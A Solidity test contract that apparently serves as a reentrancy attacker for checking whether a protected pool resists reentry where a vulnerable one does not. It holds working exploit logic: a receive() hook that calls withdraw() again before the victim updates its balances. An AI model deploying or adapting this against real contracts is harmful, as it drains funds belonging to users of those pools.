// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IWithdrawablePool {
    function contribute() external payable;
    function withdraw(uint256 amount) external;
}

/// @title ReentrancyAttacker
/// @notice Test attacker used unchanged against the safe and vulnerable pools.
/// @dev Demonstration only; the service setup never deploys this contract.
contract ReentrancyAttacker {
    IWithdrawablePool public immutable victim;
    uint256 public withdrawalAmount;
    uint256 public successfulReentries;

    constructor(address victimAddress) {
        victim = IWithdrawablePool(victimAddress);
    }

    /// @notice Initiates the attack by depositing funds and immediately withdrawing them.
    function attack() external payable {
        withdrawalAmount = msg.value;
        victim.contribute{value: msg.value}();
        victim.withdraw(msg.value);
    }

    /// @notice Fallback function triggered when the victim contract sends Ether.
    /// @dev Recursively calls withdraw() before the victim can update its balance state.
    receive() external payable {
        if (withdrawalAmount > 0 && address(victim).balance >= withdrawalAmount) {
            // A protected pool rejects the recursive withdrawal. Catch that
            // failure so the initial legitimate withdrawal can still complete.
            (bool success, ) = address(victim).call(
                abi.encodeCall(IWithdrawablePool.withdraw, (withdrawalAmount))
            );
            if (success) successfulReentries += 1;
        }
    }
}
